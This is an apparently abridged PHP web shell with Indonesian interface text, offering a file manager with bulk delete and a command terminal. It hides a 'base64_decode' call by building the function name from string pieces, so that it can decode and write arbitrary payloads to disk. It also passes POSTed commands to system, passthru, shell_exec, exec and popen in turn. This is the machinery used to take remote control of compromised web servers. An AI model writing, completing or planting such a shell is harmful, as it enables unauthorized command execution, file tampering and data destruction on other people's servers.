...
function ultraSave($path, $hex_payload) {
    ...
    $f = 'base' . (30+34) . '_de' . 'code';
    $final_data = $f($b64_data);
...
<head>
    ...
    <style>
        ...
        /* ===== Styling tambahan untuk bulk delete ===== */
...
<div class="container">
    ...
    <div class="terminal-container" id="shell_box">
        ...
        <?php if (isset($_POST['exec'])): ?>
            ...
            <?php
                ...
                $engines = ['system', 'passthru', 'shell_exec', 'exec', 'popen'];
    ...
    <!-- ===== Form bulk delete terpisah (tidak nested dengan form per baris) ===== -->
    <form id="bulkForm" method="POST" action="?path=<?php echo urlencode($currentDirectory); ?>">
        ...
        <div class="bulk-bar">
            ...
            <button type="submit" class="arrow-btn" onclick="return confirm('Yakin hapus item yang dipilih?')">➤</button>
        </div>
    </form>
</div>
